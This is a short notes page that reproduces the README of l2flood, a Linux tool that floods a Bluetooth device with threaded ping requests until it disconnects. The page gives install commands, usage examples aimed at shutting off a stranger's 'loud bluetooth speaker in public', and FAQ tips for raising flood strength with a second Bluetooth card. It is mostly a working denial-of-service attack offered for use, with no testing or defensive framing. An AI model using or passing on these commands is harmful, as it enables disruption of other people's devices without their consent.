---
Author: Sumit Kumar
Email: ravirajkarn21@gmail.com
Date Created: 2025-09-18 15:28::25 PM
tags:
  - bluetooth
  - hacking
  - command
  - Linux
  - tools
---

# [l2flood](https://github.com/kovmir/l2flood.git)

[l2ping](https://linux.die.net/man/1/l2ping) with threads.

Flood a given bluetooth device with ping requests in order to force it to disconnect.

# INSTALL
Satisfy the [dependencies](https://github.com/kovmir/l2flood#dependencies) first, and then:

```shell
git clone https://git.sr.ht/~kovmir/l2flood
cd l2flood
make # Use `make serial` to build upstream l2ping.
sudo make install
```

# USAGE
Suppose there is a loud bluetooth speaker in public, and suppose `94:3a:2c:e1:2b:07` is its address. You can shut it off like that:

```shell
l2flood 94:3a:2c:e1:2b:07 # Flood with as much threads as there are CPU cores.
l2flood -n 50 94:3a:2c:e1:2b:07 # Flood with 50 threads.
```
A weak speaker CPU will not be able to process that many ping requests, and music decoding simultaneously; so it will disconnect.

Keep in mind:

- The default delay between packets has been changed to `0`.
- The default data packet size has been increased to `600`.
- [`l2ping` options](https://linux.die.net/man/1/l2ping) work.
- _Your bluetooth card is your bottleneck: Even if you have a multi-core multi-gigahertz CPU, it makes little to no sense to spawn as much as 1,000 threads, because your bluetooth card is unlikely to be fast enough to process all the requests as quick as you submit them._

# DEPENDENCIES
- [Bluez](https://www.bluez.org/)
    - On Debian/Ubuntu/Kali `sudo apt install -y libbluetooth-dev`
# SUPPORTED OPERATING SYSTEMS
- Linux

# FAQ

**Q: Does it work in [termux](https://github.com/termux/termux-app)?**
A: No, [Bluez](https://www.bluez.org/) libraries are not available in termux.

**Q: Does it work on Steam Deck?**
A: Yes.

**Q: How to increase flood efficiency?**
A: Get a second bluetooth card, and flood using both of them.
```shell
BT_ADDR='00:00:00:00:00:00' # Set the target address.
l2flood -i hci0 $BT_ADDR &
l2flood -i hci1 $BT_ADDR
```

**Q: How to fix `Can't create socket: Operation not permitted`?**
A: Re-run as `root` user.